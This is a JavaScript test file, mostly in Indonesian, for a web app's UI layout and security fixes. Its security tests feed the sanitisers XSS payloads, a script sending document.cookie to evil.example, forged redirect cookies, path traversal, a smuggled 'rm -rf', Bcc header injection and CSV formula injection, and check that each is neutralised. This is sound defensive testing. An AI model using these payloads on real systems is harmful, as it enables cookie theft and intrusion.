import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { buildDiagramSvg, escapeSvgText } from '../../../shared/diagrams-local.js';
import { buildChartSvg, escapeChartText } from '../../../shared/charts-local.js';
import { escapeCoworkHtml } from '../../../js/ui/cowork.js';
import { sanitizeReportBody } from '../../../shared/report-export.js';
import { signPkceValue, verifyPkceValue, callbackReturn } from '../../../api/_oauth.js';
import { fillPath, bearer } from '../../../api/_http.js';
import { markdown } from '../../../shared/markdown.js';
import { previewSrcdoc } from '../../../js/studio/sandbox-runner.js';
import { cleanGitPath, cleanGitBranch } from '../../../api/connectors/github.js';
import { cleanDriveId } from '../../../api/connectors/drive.js';
import { sanitizeRawMime, rawEmail } from '../../../api/connectors/gmail.js';
import { safeCsvCell, exportPolicyAudit, PolicyEngine } from '../../../js/connectors/policy-engine.js';

const root = new URL('../../../', import.meta.url);
function read(rel) { return readFileSync(new URL(rel, root), 'utf8'); }

test('DOD-42.01 Keseragaman 1 Ekosistem Composer & Sheet Lampiran antara Obrolan Utama dan Studio Kode (shell.css, studio.css, studio.html, studio-app.js)', () => {
  const shellCss = read('css/layout/shell.css');
  const deskCss = read('css/layout/desktop.css');
  assert.match(deskCss, /#view-settings #profile-head:not\(\[hidden\]\)[\s\S]*?width:\s*fit-content;[\s\S]*?max-width:\s*360px/);
  const studioCss = read('css/ui/studio.css');
  const studioHtml = read('studio.html');
  const mainJs = read('js/main.js');
  const studioJs = read('js/studio/studio-app.js');
  const swJs = read('sw.js');

  assert.match(shellCss, /padding:\s*0 12px calc\(14px \+ env\(safe-area-inset-bottom, 0px\)\)/);
  assert.match(shellCss, /body\.keyboard-open #composer\s*\{\s*padding:\s*0 12px 12px !important;\s*background:\s*transparent !important;/);
  assert.match(studioCss, /body\.studio-page #composer[\s\S]*?padding:\s*0 12px calc\(14px \+ env\(safe-area-inset-bottom, 0px\)\)/);
  assert.match(studioCss, /body\.studio-page\.keyboard-open #composer\s*\{\s*padding:\s*0 12px 12px !important;/);
  assert.match(studioCss, /body\.studio-page \.sheet-dev-connectors[\s\S]*?border-top:\s*none !important;/);
  assert.match(studioHtml, /<div class="sheet-title">Lampiran<\/div>/);
  assert.equal(studioHtml.includes('Lampiran & Konektor'), false);
  assert.match(studioHtml, /<div id="composer-card">\s*<textarea id="chat-input"/);
  assert.match(studioJs, /function autoGrowStudioInput\(\)/);
  assert.match(mainJs, /maxViewportHeight/);
  assert.match(studioJs, /maxVvHeight/);
  assert.match(swJs, /fetch\(e\.request,\s*\{\s*cache:\s*'no-cache'\s*\}\)/);
});

test('DOD-42.02 Perbaikan overflow #messages saat #top-download-bar aktif & penghapusan gelembung pintasan di mode Mobile', () => {
  const shellCss = read('css/layout/shell.css');
  const deskCss = read('css/layout/desktop.css');
  assert.match(deskCss, /#view-settings #profile-head:not\(\[hidden\]\)[\s\S]*?width:\s*fit-content;[\s\S]*?max-width:\s*360px/);
  const msgCss = read('css/chat/messages.css');

  assert.match(shellCss, /#messages\s*\{\s*flex:\s*1 1 0%;\s*min-height:\s*0;/);
  assert.match(shellCss, /#view-chat\s*\{\s*position:\s*relative;\s*flex:\s*1 1 0%;/);
  assert.match(msgCss, /@media \(max-width: 859px\)[\s\S]*?\.chat-inspiration-grid\s*\{\s*display:\s*none !important;/);
});

test('DOD-42.03 Integrasi tombol Buka Kanvas Naskah (#cowork) di menu tindakan obrolan (#chat-options-menu)', () => {
  const menuJs = read('js/ui/chat-options-menu.js');
  assert.match(menuJs, /data-act="cowork">Buka Kanvas Naskah<\/button>/);
  assert.match(menuJs, /else if \(act === 'cowork'\)/);
  assert.match(menuJs, /cowork\.open\(/);
});

test('DOD-42.04 Kontainmen chip filter Koleksi & template Proyek di layar Mobile 390px tanpa overflow horizontal', () => {
  const collCss = read('css/collection/collection.css');
  const overCss = read('css/ui/overhaul.css');

  assert.match(collCss, /\.coll-filters\s*\{[\s\S]*?flex-wrap:\s*wrap;\s*max-width:\s*100%;/);
  assert.match(overCss, /\.project-templates\s*\{\s*display:\s*flex;\s*flex-wrap:\s*wrap;\s*max-width:\s*100%;/);
});

test('DOD-42.06 [Keamanan Siber P0 #1 — CWE-79] Perbaikan fungsi escaping HTML/SVG di diagrams-local.js, charts-local.js, dan cowork.js', () => {
  const xssPayload = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
  assert.equal(escapeSvgText(xssPayload).includes('<script>'), false);
  assert.equal(escapeChartText(xssPayload).includes('<script>'), false);
  assert.equal(escapeCoworkHtml(xssPayload).includes('<script>'), false);

  const diagSvg = buildDiagramSvg({
    type: 'flowchart',
    nodes: [{ id: 'n1', label: '<svg onload=alert(1)>' }, { id: 'n2', label: 'Aman & Bersih' }],
    edges: [{ from: 'n1', to: 'n2', label: '"><script>evil()</script>' }],
  });
  assert.equal(diagSvg.includes('<svg onload='), false);
  assert.equal(diagSvg.includes('<script>'), false);
  assert.match(diagSvg, /&lt;svg onload=alert\(1\)&gt;/);

  const chartSvg = buildChartSvg({
    type: 'bar',
    title: '<img src=x onerror=alert(1)>',
    labels: ['<b>Label 1</b>', 'Label 2'],
    datasets: [{ label: 'Data', data: [10, 20] }],
  });
  assert.equal(chartSvg.includes('<img src=x'), false);
  assert.equal(chartSvg.includes('<b>Label 1</b>'), false);
  assert.match(chartSvg, /&lt;img src=x onerror=alert\(1\)&gt;/);

  const coworkJs = read('js/ui/cowork.js');
  assert.match(coworkJs, /frame\.setAttribute\('sandbox',\s*'allow-modals'\)/);
  assert.match(coworkJs, /escapeCoworkHtml\(textOf\(\)\)/);
});

test('DOD-42.07 [Keamanan Siber P0 #2 — CWE-79] Penguatan Sanitizer HTML/SVG terhadap event handler tanpa spasi & tag <script> tak ditutup', () => {
  const slashHandler = '<svg/onload=alert(1)><img/src="x"/onerror=alert(2)><div title="a"onfocus=alert(3)>Halo</div>';
  const cleanedSlash = sanitizeReportBody(slashHandler);
  assert.equal(/onload\s*=/i.test(cleanedSlash), false);
  assert.equal(/onerror\s*=/i.test(cleanedSlash), false);
  assert.equal(/onfocus\s*=/i.test(cleanedSlash), false);
  assert.match(cleanedSlash, /Halo/);

  const unclosedScript = '<div>Aman</div><script>fetch("https://evil.example/steal?c="+document.cookie)';
  const cleanedUnclosed = sanitizeReportBody(unclosedScript);
  assert.equal(cleanedUnclosed.includes('<script'), false);
  assert.equal(cleanedUnclosed.includes('evil.example'), false);
  assert.match(cleanedUnclosed, /<div>Aman<\/div>/);

  const artJs = read('js/ui/artifact.js');
  const artsPageJs = read('js/artifacts/artifacts.js');
  assert.match(artJs, /sanitizeReportBody\(markup\)/);
  assert.match(artsPageJs, /sanitizeReportBody\(body\)/);
});

test('DOD-42.08 [Keamanan Siber P0 #3 — CWE-601 & CWE-565] Penandatanganan HMAC-SHA256 Cookie PKCE rg_pkce & validasi sameOrigin pada callbackReturn', () => {
  const payload = { verifier: 'kode-uji-pkce', state: 'status-pkce', returnTo: 'https://tegoan.vercel.app/#/connect' };
  const signed = signPkceValue(payload);
  assert.ok(signed.includes('.'));
  const verified = verifyPkceValue(signed);
  assert.deepEqual(verified, payload);

  const forgedPlainBase64 = Buffer.from(JSON.stringify({ returnTo: 'https://evil.attacker.com/steal' })).toString('base64url');
  assert.equal(verifyPkceValue(forgedPlainBase64), null);

  const tamperedSig = signed.slice(0, -4) + 'AAAA';
  assert.equal(verifyPkceValue(tamperedSig), null);

  const evilPayload = signPkceValue({ verifier: 'kode-uji-dua', state: 'status-dua', returnTo: 'https://evil.attacker.com/pwn' });
  const fakeReq = {
    headers: {
      host: 'tegoan.vercel.app',
      'x-forwarded-proto': 'https',
      cookie: 'rg_pkce=' + encodeURIComponent(evilPayload),
    },
  };
  const safeUrl = callbackReturn(fakeReq, '/#/connect');
  assert.equal(safeUrl.startsWith('https://tegoan.vercel.app'), true);
  assert.equal(safeUrl.includes('evil.attacker.com'), false);
});

test('DOD-42.09 [Keamanan Siber P0 #4 — CWE-22 & CWE-20] Sanitasi Path Traversal cleanGitPath di GitHub & cleanDriveId di Google Drive', () => {
  assert.equal(cleanGitPath('../../etc/passwd'), 'etc/passwd');
  assert.equal(cleanGitPath('/src/../js//main.js\r\n'), 'src/js/main.js');
  assert.equal(cleanGitPath('../../../'), '');
  assert.equal(cleanGitBranch('refs/heads/../../main;rm -rf'), 'mainrm-rf');

  assert.equal(cleanDriveId('1_OOy4HMOu5TnsLHhITdniuMdzUr9X7vL'), '1_OOy4HMOu5TnsLHhITdniuMdzUr9X7vL');
  assert.equal(cleanDriveId('../../file?alt=media&x=1'), 'filealtmediax1');

  const ghSrc = read('api/connectors/github.js');
  const driveSrc = read('api/connectors/drive.js');
  assert.match(ghSrc, /const safePath = cleanGitPath\(params\.path\)/);
  assert.match(driveSrc, /cleanDriveId\(params\.parent_id\)/);
  assert.match(driveSrc, /cleanDriveId\(params\.add_parents\)/);
});

test('DOD-42.10 [Keamanan Siber P0 #5 — CWE-93 & CWE-1236] Sanitasi Header MIME Mentah (params.raw) di Gmail & Netralisasi Injeksi Rumus CSV di exportPolicyAudit', () => {
  const smuggledMime = [
    'To: victim@example.com',
    'Subject: Laporan',
    'Bcc: spy@evil.example',
    'Resent-Bcc: leak@evil.example',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'Isi pesan rahasia',
  ].join('\r\n');
  const rawParam = Buffer.from(smuggledMime).toString('base64url');
  const sanitized = sanitizeRawMime(rawParam);
  const decoded = Buffer.from(sanitized, 'base64url').toString('utf8');
  assert.equal(/Bcc:/i.test(decoded), false);
  assert.equal(/Resent-Bcc:/i.test(decoded), false);
  assert.match(decoded, /To: victim@example\.com/);
  assert.match(decoded, /Isi pesan rahasia/);
  assert.equal(rawEmail({ raw: rawParam }), sanitized);

  assert.equal(safeCsvCell('=CMD|\' /C calc\'!A0'), '\'=CMD|\' /C calc\'!A0');
  assert.equal(safeCsvCell('+SUM(1,2)'), '\'+SUM(1 2)');
  assert.equal(safeCsvCell('-2+3'), '\'-2+3');
  assert.equal(safeCsvCell('@IMPORTXML()'), '\'@IMPORTXML()');
  assert.equal(safeCsvCell('github_get_user'), 'github_get_user');

  const engine = new PolicyEngine({ confirmed: () => true, reauth: () => true });
  engine.assert('=evil_tool_read', { page: 1 });
  const csv = exportPolicyAudit('csv');
  assert.equal(csv.includes('\n=evil_tool_read,'), false);
  assert.match(csv, /'=evil_tool_read/);
});

test('DOD-42.11 Penguatan Keamanan Siber SEC-01 s/d SEC-05, Perbaikan Alur BUG-01 s/d BUG-06, dan Peningkatan ENH-01 s/d ENH-04', () => {
  const settingsJs = read('js/account/settings.js');
  assert.match(settingsJs, /Masukkan PIN saat ini untuk menonaktifkan kunci/);
  assert.match(settingsJs, /await pin\.verify\(/);

  const used = new Set();
  const safePath = fillPath('/repos/{owner}/{repo}/contents/{path}', { owner: '..evil..', repo: '../user', path: '../js/main.js' }, used);
  assert.equal(safePath.includes('..'), false);
  assert.match(safePath, /\/contents\/js\/main\.js$/);

  const cookiePayload = Buffer.from(JSON.stringify({ connector: 'github', access_token: 'gho_cookie_tok' })).toString('base64url');
  const cookieToken = bearer({ headers: { cookie: 'rg_oauth=' + encodeURIComponent(cookiePayload) } });
  assert.equal(cookieToken, 'gho_cookie_tok');

  const srcdoc = previewSrcdoc(
    { 'index.html': '<!doctype html><html><body><input id="x"></body></html>' },
    { fields: [{ key: 'x', value: '</script><script>window.__pwn=1</script>' }], scrollY: 0, session: [] }
  );
  assert.equal(srcdoc.includes('"</script><script>window.__pwn=1</script>"'), false);
  assert.match(srcdoc, /<\\\/script><script>window\.__pwn=1<\\\/script>/);

  const mdHtml = markdown.render('Lihat [https://example.com](https://example.com) dan Sumber::Rujukan|https://example.org/"onclick="alert(1)');
  assert.equal(/<a[^>]*><a/i.test(mdHtml), false);
  assert.equal(mdHtml.includes('onclick='), false);

  const artifactsJs = read('js/artifacts/artifacts.js');
  assert.match(artifactsJs, /buildDocxBytes/);
  assert.match(artifactsJs, /buildXlsxBytes/);
  assert.match(artifactsJs, /addEventListener\('hashchange'/);

  const histMenuJs = read('js/history/histmenu.js');
  assert.match(histMenuJs, /m\.id = 'hist-menu'/);
  assert.match(histMenuJs, /addEventListener\('contextmenu'/);

  const studioHtml = read('studio.html');
  assert.match(studioHtml, /id="btn-git-pull-now"/);
  assert.match(studioHtml, /id="btn-git-push-now"/);

  const previewHtml = read('studio-preview.html');
  assert.match(previewHtml, /data-live-style/);
  assert.match(previewHtml, /querySelector\('\[name='/);
});

test('DOD-42.12 Proteksi Tombol Scroll-Down terhadap Tombol Hapus Lampiran (X), Kartu Dokumen/Gambar Mandiri, & Gelembung Pesan User Modern', () => {
  const scrollJs = read('js/ui/scrolldown.js');
  const scrollCss = read('css/ui/scroll.css');
  const attachJs = read('js/sheets/attach.js');
  const sheetsCss = read('css/sheets/sheets.css');
  const chatJs = read('js/chat/chat.js');
  const msgCss = read('css/chat/messages.css');

  assert.match(scrollJs, /hasComposerOverlay\(\)/);
  assert.match(scrollJs, /syncPosition\(\)/);
  assert.match(scrollCss, /body\.has-attach-draft \.scroll-down/);
  assert.match(scrollCss, /body:has\(#attach-row:not\(\[hidden\]\)\) \.scroll-down/);
  assert.match(attachJs, /export function fileTypeIconSvg/);
  assert.match(attachJs, /has-attach-draft/);
  assert.match(sheetsCss, /\.attach-row\.is-multi/);
  assert.match(chatJs, /mediaCard\.className = 'msg-media-card'/);
  assert.match(chatJs, /fileTypeIconSvg\(kind\)/);
  assert.match(chatJs, /bubble\.className = 'msg-user-bubble'/);
  assert.match(msgCss, /\.msg-user-bubble/);
  assert.match(msgCss, /\.msg-media-card/);
  assert.match(msgCss, /\.msg\.user:has\(\.msg-user-bubble\)/);
});
